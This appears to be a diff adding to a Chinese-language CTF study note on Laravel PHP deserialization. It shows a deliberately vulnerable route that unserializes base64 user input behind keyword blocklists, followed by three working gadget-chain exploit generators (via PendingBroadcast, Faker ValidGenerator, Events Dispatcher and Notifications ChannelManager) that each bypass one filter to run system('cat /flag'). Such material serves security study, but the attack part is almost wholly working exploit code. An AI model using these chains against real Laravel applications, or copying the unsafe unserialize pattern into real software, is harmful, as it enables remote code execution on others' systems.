@@ -52,7 +52,144 @@ namespace Illuminate\Broadcasting {
 ?>
 ```
 
+^
+## **有过滤**
+过滤1
+```
+Route::get('/', function () {
+    return view('welcome');
+});
+Route::get('admin/{obj}',function($s){
+	if(preg_match('/defaultChannel|listeners|Bus|messages|CallQueuedClosure/i', base64_decode($s))){
+		die('other way');
+	}
+	if($s){
+		unserialize(base64_decode($s));
+		return 'unserialize done'.$s;
+	}else{
+		return 'unserialize error'.$s;
+	}
+});
+```
 
+```
+<?php
+namespace Illuminate\Broadcasting
+{
+    use Faker\ValidGenerator;
+    class PendingBroadcast
+    {
+        protected $events;
+        public function __construct($cmd)
+        {
+            $this->events = new ValidGenerator($cmd);
+        }
+    }
+    $seri = new PendingBroadcast('cat /flag');
+    echo base64_encode(serialize($seri));
+}
+
+namespace Faker
+{
+    use Faker\DefaultGenerator;
+    class ValidGenerator
+    {
+        protected $maxRetries;
+        protected $validator;
+        protected $generator;
+        public function __construct($cmd)
+        {
+            $this->generator = new DefaultGenerator($cmd);
+            $this->maxRetries = 10000000;
+            $this->validator = 'system';
+        }
+
+    }
+}
+
+namespace Faker
+{
+    class DefaultGenerator
+    {
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this->default = $cmd;
+        }
+    }
+}
+?>
+```
+过滤2
+```
+if(preg_match('/defaultChannel|Validation|Bus|messages|CallQueuedClosure/i', base64\_decode($s))){ die('other way'); }
+```
+```
+<?php
+namespace Illuminate\Broadcasting
+{
+    use  Illuminate\Events\Dispatcher;
+    class PendingBroadcast
+    {
+        protected $events;
+        protected $event;
+        public function __construct($cmd)
+        {
+            $this->events = new Dispatcher($cmd);
+            $this->event=$cmd;
+        }
+    }
+    echo base64_encode(serialize(new PendingBroadcast('cat /flag')));
+}
+
+
+namespace Illuminate\Events
+{
+    class Dispatcher
+    {
+        protected $listeners;
+        public function __construct($event){
+            $this->listeners=[$event=>['system']];
+        }
+    }
+}
+```
+过滤3
+```
+if(preg_match('/listeners|Validation|Bus|messages|CallQueuedClosure/i', base64\_decode($s))){ die('other way'); }
+```
+```
+<?php
+namespace Illuminate\Notifications {
+    class ChannelManager {
+        protected $app;
+        protected $customCreators;
+        protected $defaultChannel;
+        public function __construct() {
+            $this->app = 'cat /flag';
+            $this->defaultChannel = 'fallingskies';
+            $this->customCreators = ['fallingskies' => 'system'];
+        }
+    }
+}
+
+
+namespace Illuminate\Broadcasting {
+    use  Illuminate\Notifications\ChannelManager;
+    class PendingBroadcast {
+        protected $events;
+        public function __construct()
+        {
+            $this->events = new ChannelManager();
+        }
+    }
+    echo base64_encode(serialize(new PendingBroadcast()));
+}
+?>
+```
+
+
+^
 ## **Laravel5.7反序列化**
 ```
 <?php
